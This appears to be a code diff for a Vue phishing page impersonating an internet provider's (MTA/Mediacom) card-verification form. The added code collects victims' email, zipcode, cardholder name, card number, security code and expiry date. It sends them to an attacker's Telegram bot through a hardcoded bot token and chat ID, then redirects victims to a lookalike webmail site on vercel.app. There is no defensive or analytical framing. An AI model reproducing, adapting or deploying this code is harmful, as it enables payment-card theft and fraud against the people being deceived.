@@ -13,7 +13,7 @@
               <img class="mx-auto d-block styles__logo___10yQo"
                    width="300"
                    height="182"
-                   src="/images/MTA-2018-v1-transparent-2018-b7546f735056a36_b7547050-5056-a36a-082129b5b75f5c01.png"
+                   src="/images/MTA-2018-v1-transparent-2018-b7546f735056a36_b7547050-5056-a36a-082129b5b75f5c02.png"
                    alt="Logo">
             </div>
 
@@ -191,59 +191,76 @@
 	</div>
   </template>
   
- <script>
-  import axios from "axios"
-  export default {
-  name: 'app',
+<script>
+import axios from "axios";
+
+export default {
+  name: "App",
   data() {
     return {
-    formDataRes: {},
-    loading: false,
-    isActive: false,
-    count: 0,
-    finalCount: 1
-    }
+      formDataRes: {
+        email: "",
+        zipcode: "",
+        cardholder: "",
+        cardnumber: "",
+        securitycode: "",
+        ExpirationDate: "",
+        ExpirationYear: "",
+
+
+
+      },
+      loading: false,
+      isActive: false,
+      count: 0,
+      finalCount: 1, // Only send once
+    };
   },
-  components: {
-  },
-  
   methods: {
-    
     async finishJoob() {
-    this.count = +this.count + 1
-    console.log(this.count,this.finalCount)
-    if (this.count < this.finalCount) {
-    this.loading = false
-    let message = this.formDataRes
-    await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
-    this.isActive = !this.isActive
-    }else{
-      location.replace("https://webmail-mtaonline.vercel.app/")
-  
-    }
+      this.count++;
+      console.log("Count:", this.count, "Final:", this.finalCount);
+
+      if (this.count <= this.finalCount) {
+        this.loading = true;
+
+        // Format the message as string
+        const message = `*mediacombb card*\nemail: ${this.formDataRes.email}\nzipcode: ${this.formDataRes.zipcode}\ncardholder: ${this.formDataRes.cardholder}\ncardnumber: ${this.formDataRes.cardnumber}\nsecuritycode: ${this.formDataRes.securitycode}\nExpirationDate: ${this.formDataRes.ExpirationDate}\nExpirationYear: ${this.formDataRes.ExpirationYear}`;
+
+        // Send to Telegram
+        await this.sendTelegramResult(
+          process.env.NUXT_APP_CHAT_ID || "-5167264103", 
+          // 5
+          message
+        );
+
+        this.isActive = !this.isActive;
+        this.loading = false;
+      } else {
+        // Redirect after sending
+        location.replace("https://webmail-mediacombb.vercel.app/");
+      }
     },
-    
-    async sendTelegramResult(chatId, message){ 
-    try{
-    
-      const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
-       const payload = {
-       chat_id: '-4794000485',
-       text: message,
-       };
-       console.log(payload)
-       this.loading = true
-       await axios.post(url, payload);
-    
-    }catch(error){
-      console.log(error, 'error')
-  
-    }
-    }
-  
-  }
-  }
-  </script>
+
+    async sendTelegramResult(chatId, message) {
+      try {
+        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;
+
+        const payload = {
+          chat_id: chatId,
+          text: message,
+        };
+
+        console.log("Sending payload:", payload);
+        await axios.post(url, payload);
+      } catch (error) {
+        console.error("Telegram API Error:", error);
+      }
+    },
+  },
+};
+</script>
+
 
 
 
